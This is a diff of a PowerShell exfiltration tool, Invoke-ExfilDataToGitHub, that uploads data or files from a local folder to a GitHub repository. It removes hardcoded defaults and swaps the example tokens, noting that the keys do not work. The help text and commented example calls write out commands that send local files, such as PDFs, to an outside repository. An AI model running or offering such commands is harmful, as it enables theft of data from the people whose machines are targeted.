@@ -38,13 +38,13 @@ Data to write to file
 
 
 .EXAMPLE
-# This example exfiltrates data to a file
+# This example exfiltrates data to a file - keys do not work
 
-Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y==" 
+Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ==" 
                                                 -GHFilePath "testfolder/" -GHFileName "testfile3" -Data "a bit of test data"
 .EXAMPLE
 # This example exfiltrates files from a given directory and filter
-Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y=="
+Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ=="
    -GHFilePath "testfolder/" -LocalfilePath "C:\temp\" -Filter "*.pdf"
 
 #>
@@ -53,35 +53,35 @@ Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3Mz
 
         [Parameter(Position = 0, Mandatory = $True)]
         [String]
-        $GHUser = "nnh100",
+        $GHUser,
 
         [Parameter(Position = 1, Mandatory = $True)]
         [String]
-        $GHRepo = "exfil",
+        $GHRepo,
 
         [Parameter(Position = 2, Mandatory = $True)]
         [String]
-        $GHPAT = "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y==", # This should be base 64 encoded
+        $GHPAT, # This should be base 64 encoded
 
         [Parameter(Position =3, Mandatory = $True)]
         [String]
-        $GHFilePath = "testfolder2/",
+        $GHFilePath,
 
         [Parameter(Position = 4, Mandatory=$True, ParameterSetName="ExfilFilesFromFilePath")]
         [String]
-        $LocalFilePath = "C:\temp\",
+        $LocalFilePath,
 
         [Parameter(Position = 4, Mandatory = $True, ParameterSetName="ExfilDataToFile")]
         [String]
-        $GHFileName = "testfile1",
+        $GHFileName,
 
         [Parameter(Position = 5, Mandatory = $True, ParameterSetName="ExfilFilesFromFilePath")]
         [String]
-        $Filter = "*.*",
+        $Filter,
 
         [Parameter(Position = 5, Mandatory = $True, ParameterSetName="ExfilDataToFile")]
         [Object]
-        $Data = "test data"
+        $Data
 
     )
 
@@ -258,8 +258,8 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
 
 }
 
+# Examples - keys do not work
 
+#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0==" -GHFilePath "testfolder/" -LocalfilePath "C:\temp\" -Filter "*.*"
 
-#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y==" -GHFilePath "testfolder/" -LocalfilePath "C:\temp\" -Filter "*.*"
-
-#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y==" -GHFilePath "testfolder/" -GHFileName "myfile.txt" -data "a bit of test data"
+#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0==" -GHFilePath "testfolder/" -GHFileName "myfile.txt" -data "a bit of test data"
